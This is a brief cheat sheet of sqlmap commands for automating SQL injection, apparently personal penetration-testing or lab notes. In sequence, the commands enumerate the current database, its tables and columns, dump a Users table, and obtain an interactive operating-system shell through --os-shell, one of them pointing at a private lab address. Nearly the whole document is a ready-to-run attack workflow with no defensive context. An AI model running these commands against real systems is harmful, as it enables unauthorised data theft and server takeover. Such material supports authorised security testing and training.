# SQLMAP - Automating SQLi
```bash
# Get current database
sqlmap -r file.req --dbms=mysql --os=linux --current-db
# Get tables from database
sqlmap -r file.req --dbms=mysql --os=linux -D zm --tables
# Get columns from database table
sqlmap -r file.req --dbms=mysql --os=linux -D zm -T Users --columns
# Dump the data
sqlmap -r file.req --dbms=mysql --os=linux -D zm -T Users -C Users --dump

# Get a Shell
sqlmap -r file.req --dbms=mysql --os=linux --os-shell

```



```bash
# POST  request using user variable 
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user

# Burp -> take POST request, copy to file "request.txt", identify VAR for -p below , DUMP DB 
sqlmap -r request2.txt -p uid --dump

# get interactive shell
sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
```

